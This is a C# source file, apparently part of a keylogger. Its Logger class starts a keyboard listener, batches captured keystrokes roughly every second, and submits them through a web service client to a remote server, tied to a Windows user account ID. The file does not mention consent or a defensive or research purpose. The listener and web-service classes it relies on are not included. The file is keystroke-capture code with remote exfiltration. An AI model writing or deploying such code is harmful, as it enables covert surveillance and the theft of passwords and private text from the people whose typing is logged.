using System;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Net;
using Microsoft.Win32;

namespace Logger
{
    using Keyboard;
    using Webservice;

    class Logger : IDisposable
    {
        private static Lazy<Logger> instance = new Lazy<Logger>(() => new Logger());

        public static Logger Instance
        {
            get { return instance.Value; }
        }

        public bool Active { get; private set; } = false;

        private readonly object startStopSyncObj = new object();

        Webservice.Client webservice = null;
        string userAccountID;

        KeyboardListener listener = null;
        KeyboardLogger logger = null;

        private Logger()
        {
        }

        /// <summary>
        /// Starts logger in current user session
        /// </summary>
        /// <param name="webserviceAuthToken">Authentication token returned by an earlier call to Webservice.Register </param>
        /// <param name="userAccountID">The ID, corresponding to the currently logged in Windows user, as returned by an earlier call to Webservice.CreateUserAccount</param>
        public void Start(string webserviceAuthToken, string userAccountID)
        {
            lock (startStopSyncObj)
            {
                if (Active)
                    return;

                Active = true;

                webservice = new Webservice.Client(webserviceAuthToken);
                this.userAccountID = userAccountID;

                listener = new KeyboardListener();
                logger = new KeyboardLogger(listener, TimeSpan.FromSeconds(1), OnDispatch: DispatchLogs);
            }
        }

        public void Stop()
        {
            lock (startStopSyncObj)
            {
                if (!Active)
                    return;

                listener?.Dispose();
                logger?.Flush();

                Active = false;
            }
        }

        public void Flush()
        {
            logger?.Flush();
        }

        bool DispatchLogs(IEnumerable<Keylog> logs)
        {
            try
            {
                if (!webservice.IsRegistered)
                    return false;

                webservice.SubmitKeylogs(userAccountID, logs);
                return true;
            }
            catch (WebException exception) when (exception.Status == WebExceptionStatus.ConnectFailure)
            {
                Program.Trace(exception.Message);
            }
            catch (Exception exception)
            {
                Program.Trace(exception.Message);
            }

            return false;
        }

        public void Dispose()
        {
            listener?.Dispose();
            instance = null;
        }
    }
}
